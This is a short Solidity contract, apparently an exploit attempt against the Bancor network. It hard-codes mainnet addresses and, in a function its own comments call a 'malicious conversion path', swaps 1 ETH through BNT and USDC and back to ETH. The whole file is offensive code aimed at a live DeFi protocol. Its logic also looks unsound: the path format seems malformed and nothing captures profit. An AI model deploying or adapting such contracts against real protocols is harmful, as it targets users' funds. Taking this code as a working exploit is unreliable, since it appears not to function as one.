pragma solidity ^0.8.19;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IBancorNetwork {
    function convertByPath(
        address[] memory _path,
        uint256 _amount,
        uint256 _minReturn,
        address _beneficiary,
        address _affiliateAccount,
        uint256 _affiliateFee
    ) external payable returns (uint256);

    function rateByPath(address[] memory _path, uint256 _amount) external view returns (uint256);
}

contract Strategy {
    address constant BANCOR_NETWORK = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address constant ETH_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address constant BNT = 0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function run() public {
        // Create malicious conversion path
        address[] memory path = new address[](5);
        path[0] = ETH_TOKEN;  // Start with ETH
        path[1] = BNT;        // Convert to BNT through relay
        path[2] = USDC;       // Convert to USDC
        path[3] = BNT;        // Back to BNT
        path[4] = ETH_TOKEN;  // Finally back to ETH

        // Get initial rate
        uint256 amount = 1 ether;
        uint256 expectedReturn = IBancorNetwork(BANCOR_NETWORK).rateByPath(path, amount);

        // Execute conversion with minimal slippage check
        uint256 minReturn = expectedReturn * 95 / 100; // Allow 5% slippage

        IBancorNetwork(BANCOR_NETWORK).convertByPath{value: amount}(
            path,
            amount,
            minReturn,
            address(this),
            address(0),
            0
        );
    }

    receive() external payable {}
}
